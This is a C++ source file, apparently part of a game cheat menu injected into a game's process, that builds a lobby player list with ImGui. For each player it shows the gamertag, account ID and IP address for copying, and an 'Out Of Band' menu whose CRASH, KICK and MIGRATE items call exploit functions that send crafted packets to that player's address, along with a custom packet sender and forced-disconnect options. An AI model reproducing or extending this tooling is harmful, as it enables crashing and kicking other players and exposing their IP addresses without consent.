#include "players.h"

inline LobbySession* get_client_session(const LobbyType lobbyType) {
	return reinterpret_cast<LobbySession*>(dwProcessBase + 0xEB3E060 + sizeof(LobbySession) * lobbyType);
}

namespace players_list
{
	void draw()
	{
		const auto lobby_session{ get_client_session(LOBBY_TYPE_GAME) };
		const auto party_session{ get_client_session(LOBBY_TYPE_PRIVATE) };

		LobbySession* session = nullptr;
		if (lobby_session->active || (session = party_session, !party_session->active))
			session = lobby_session;

		if (session == nullptr)
		{
			return;
		}

		if (ImGui::BeginTabItem("Players"))
		{
			ImGui::Dummy(ImVec2(0, 5));

			ImGui::BeginColumns("Players", 2, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 28.0f);
			ImGui::TextUnformatted("#");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Player");

			ImGui::SameLine();
			ImGui::Dummy(ImVec2(365.0f, 0.0f));
			ImGui::SameLine();

			if (ImGui::Button("Add All")) {
				int numberOfPeopleAdded = 0;
				std::vector<std::string> people{};

				for (size_t i = 0; i < 18; ++i)
				{
					const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

					if (target_client && target_client->activeClient)
					{
						const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
						const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

						bool old = false;

						for (auto& friends : friends::friends) {
							if (friends.xuid == player_xuid)
								old = true;
						}
						if (old == false) {
							friends::friends.emplace_back(friends::friends_t{ player_xuid, player_name });
							friends::write_to_friends();
							people.push_back(player_name);
							numberOfPeopleAdded++;
						}
					}
				}

				if (numberOfPeopleAdded > 0)
				{
					friends::refresh_friends();
				}

				char msgg[500];
				sprintf_s(msgg, "Added %d players to friends list\n", numberOfPeopleAdded);

				ImGui::InsertNotification({ ImGuiToastType_Status, 5000,  msgg });

				for (auto& person : people)
				{
					ImGui::InsertNotification({ ImGuiToastType_Friends, 5000, person.data() });
				}

			}

			ImGui::NextColumn();
			ImGui::Separator();

			for (size_t i = 0; i < 18; ++i)
			{
				bool team = false;
				int d = 0;
				for (auto& p : players)
				{
					if (i == d)
					{
						team = p.team;
						break;
					}
					else
						d++;
				}

				const auto target_client{ LobbySession_GetClientByClientNum(session, i) };

				if (target_client && target_client->activeClient)
				{

					ImGui::AlignTextToFramePadding();
					ImGui::TextUnformatted(std::to_string(i).data());

					ImGui::NextColumn();

					bool player_selected = false;

					const auto player_xuid{ target_client->activeClient->fixedClientInfo.xuid };
					const auto player_name{ target_client->activeClient->fixedClientInfo.gamertag };

					if (!team && player_xuid == LiveUser_GetXUID(0))
						team = true;

					ImGui::AlignTextToFramePadding();

					ImGui::PushStyleColor(ImGuiCol_Text, team == true ? ImColor(24, 191, 205, 250).Value : ImColor(160, 50, 23, 250).Value);
					player_selected = ImGui::Selectable((player_name + "##"s + std::to_string(i)).data());
					ImGui::PopStyleColor();

					const auto popup{ "player_popup##" + std::to_string(i) };

					const auto netadr{ target_client->activeClient->sessionInfo[session->type].netAdr };
					const auto is_netadr_valid{ netadr.inaddr };
					const auto ip{ utils::adr_to_string(&netadr)};

					if (player_selected)
					{
						ImGui::OpenPopup(popup.data());
					}

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						ImGui::MenuItem(player_name + "##"s + std::to_string(i) + "player_menu_item", nullptr, false, false);

						if (ImGui::IsItemClicked())
						{
							ImGui::LogToClipboardUnformatted(player_name);
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}

						ImGui::Separator();

						if (ImGui::MenuItem(std::to_string(player_xuid)))
						{
							ImGui::LogToClipboardUnformatted(std::to_string(player_xuid));
						}

						if (ip != "0.0.0.0")
						{
							if (ImGui::MenuItem(ip))
							{
								ImGui::LogToClipboardUnformatted(ip);
							}
						}

						if (ImGui::BeginMenu("Out Of Band")) {

							ImGui::Dummy(ImVec2(0.0f, 1.0f));

							if (ImGui::MenuItem("CRASH", nullptr, nullptr, netadr.inaddr))
							{
								exploit::SendToAdr(player_xuid, netadr);
							}

							ImGui::Dummy(ImVec2(0.0f, 2.0f));

							if (ImGui::MenuItem("KICK", nullptr, nullptr, netadr.inaddr))
							{
								exploit::send_connect_response_migration_packet(netadr);
							}

							ImGui::Dummy(ImVec2(0.0f, 2.0f));

							if (ImGui::MenuItem("MIGRATE", nullptr, nullptr, is_netadr_valid))
							{
								exploit::send_mstart_packet(netadr);
							}

							ImGui::Dummy(ImVec2(0.0f, 2.0f));

							if (ImGui::BeginMenu("CUSTOM OOB")) {

								static auto MSG_NET = ""s;

								ImGui::InputTextWithHint("##MSG_NET", "OOB/STRING", &MSG_NET);

								ImGui::SameLine();

								if (ImGui::MenuItem("Send", nullptr, nullptr, netadr.inaddr))
								{
									send_oob(netadr, MSG_NET);
								}

								ImGui::EndMenu();
							}

							ImGui::Dummy(ImVec2(0.0f, 1.0f));

							ImGui::EndMenu();
						}

						ImGui::Separator();

						if (ImGui::BeginMenu("Disconnects"))
						{
							ImGui::Dummy(ImVec2(0.0f, 3.0f));

							for (int i = 0; i < 6; i++)
							{
								if (ImGui::MenuItem(kicks[i], nullptr, nullptr))
								{
									LobbyClientMsg_SendDisconnectClient(0, session->type, player_xuid, i);
								}
							}

							ImGui::EndMenu();
						}

						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}
			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}
}